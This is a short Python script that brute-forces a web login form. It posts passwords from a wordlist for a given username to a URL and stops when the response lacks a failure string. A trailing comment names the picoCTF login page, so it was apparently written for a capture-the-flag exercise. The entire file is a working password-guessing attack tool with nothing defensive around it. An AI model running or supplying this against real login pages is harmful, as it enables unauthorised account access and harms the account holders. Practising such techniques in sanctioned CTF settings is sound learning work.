import requests
import argparse


parser = argparse.ArgumentParser()
parser.add_argument('--url', type=str, required=True)
parser.add_argument('--username', type=str, required=True)
parser.add_argument('--wordlist', type=str, required=True)
#parser.add_argument('--f', type=str, required=True)
args = parser.parse_args()

url = args.url

username = args.username

wordlists_path = args.wordlist

#Invalid_msg = args.f




#reading wordlist file
with open(wordlists_path) as wordlists:
    try:
        for passwd in wordlists:
            data = {'username':username, 'password':passwd}
            r = requests.post(url, data=data)
            if 'password is incorect' not in r.text:
                #print(r.text)
                print("Password found:%s" %(passwd))
                break
            else:
                print("checking %s with username:%s and password:%s" %(url, username, passwd) )
    except KeyboardInterrupt:
        print("[+]Quitting... ")



#https://play.picoctf.org/login